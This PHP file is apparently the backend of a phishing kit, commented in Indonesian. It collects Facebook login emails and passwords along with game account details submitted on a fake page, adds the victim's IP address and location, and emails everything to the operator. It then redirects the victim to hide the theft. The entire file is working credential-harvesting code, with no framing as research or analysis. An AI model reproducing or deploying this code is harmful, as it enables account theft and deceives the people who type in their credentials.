<?php
// MENGAMBIL KONTROL
include 'fsystem/setting.php';
include 'fsystem/location.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$login = $_POST['login'];

$country  = $khcodes['country'];
$region   = $khcodes['regionName'];
$city     = $khcodes['city'];
$ipAddr   = $khcodes['query'];

$setRyusCalling = $ryuCalling['country_code'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == ""){
header("Location: processing.php");
}else{
	$file_lines = file('fsystem/checkLogin.txt');
	foreach ($file_lines as $file => $value) {
		$data = explode("|", $value);
		if (in_array($email, $data)) {
			header('location: success.php');
		} else {
			$myfile = fopen("fsystem/checkLogin.txt", "a") or die("Unable to open file!");
			$txt = $email;
			if(fwrite($myfile, "|". $txt)) {
				include"fsystem/.locationError.php";
				//KONTEN UNTUK KIRIM KE EMAIL
				$subjek = "$resultFlags LEVEL $level | $rpt | ID $playid";
				$pesan = <<<EOD
					<!DOCTYPE html>
					<html>
					<head>
						<title></title>
						<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
						<style type="text/css">
							body {
								font-family: "Helvetica";
								width: 90%;
								display: block;
								margin: auto;
								border: 1px solid #fff;
								background: #fff;
							}

							.result {
								width: 100%;
								height: 100%;
								display: block;
								margin: auto;
								position: fixed;
								top: 0;
								right: 0;
								left: 0;
								bottom: 0;
								z-index: 999;
								overflow-y: scroll;
							}

							.tblResult {
								width: 100%;
								display: table;
								margin: 0px auto;
								border-collapse: collapse;
								text-align: center;
								background: rgba(247,129,129, 0.1);
							}

							.tblResult th {
								text-align: left;
								font-size: 0.75em;
								margin: auto;
								padding: 15px 10px;
								background: #F8E0EC;
								border: 2px solid #F8E0EC;
								color: #0B0B0B;
							}

							.tblResult td {
								font-size: 0.75em;
								margin: auto;
								padding: 10px;
								border: 2px solid #F8E0EC;
								text-align: left;
								font-weight: bold;
								color: #0B0B0B;
								text-shadow: 0px 0px 10px #fff;

							}

							.tblResult th img {
								width: 45px;
								display: block;
								margin: auto;
								border-radius: 50%;
								box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
							}
						</style>
					</head>
					<body>
						<div class="result">
							<table class="tblResult">
								<tr>
									<th style="text-align: center;" colspan="3">Informasi Akun Facebook</th>
								</tr>
								<tr>
									<td style="border-right: none;">Email Akun</td>
									<td style="text-align: right;">$email</td>
								</tr>
								<tr>
									<td style="border-right: none;">Password Akun</td>
									<td style="text-align: right;">$password</td>
								</tr>
								
								<tr>
									<td style="border-right: none;">Id Akun</td>
									<td style="text-align: right;">$playid</td>
								</tr>
<tr>
									<td style="border-right: none;">Nick Akun</td>
									<td style="text-align: right;">$nick</td>
								</tr>
								<tr>
									<td style="border-right: none;">Level Akun</td>
									<td style="text-align: right;">Level $level</td>
								</tr>
								<tr>
									<td style="border-right: none;">Tier Level</td>
									<td style="text-align: right;">$tier</td>
								</tr>
								<tr>
									<td style="border-right: none;">EP Type</td>
									<td style="text-align: right;">$rpt</td>
								</tr>
								
								<tr>
									<td style="border-right: none;">Login</td>
									<td style="text-align: right;">$login</td>
								</tr>
								<tr>
									<th style="text-align: center;" colspan="3">Informasi Device</th>
								</tr>
								<tr>
									<td style="border-right: none;">Country</td>
									<td style="text-align: right;">$country</td>
								</tr>
								<tr>
									<td style="border-right: none;">Region</td>
									<td style="text-align: right;">$region</td>
								</tr>
								<tr>
									<td style="border-right: none;">City</td>
									<td style="text-align: right;">$city</td>
								</tr>
								<tr>
									<td style="border-right: none;">IP Address</td>
									<td style="text-align: right;">$ipAddr</td>
								</tr>
								<tr>
								<th style="text-align: center;" colspan="3">2020 &copy; AMFCODE</th>
								</tr>
							</table>
						</div>
					</body>
					</html>
EOD;
				include 'email.php';
				$headers  = 'MIME-Version: 1.0' . "\r\n";
				$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
				$headers .= ''.$sender.'' . "\r\n";
				$kirim = mail($emailku, $subjek, $pesan, $headers);
				
				//MENGALIHKAN KE GRUP WHATSAPP
				echo '<script>window.location.replace("../processing.php")</script>';
			}	
		}
	}
}

?>
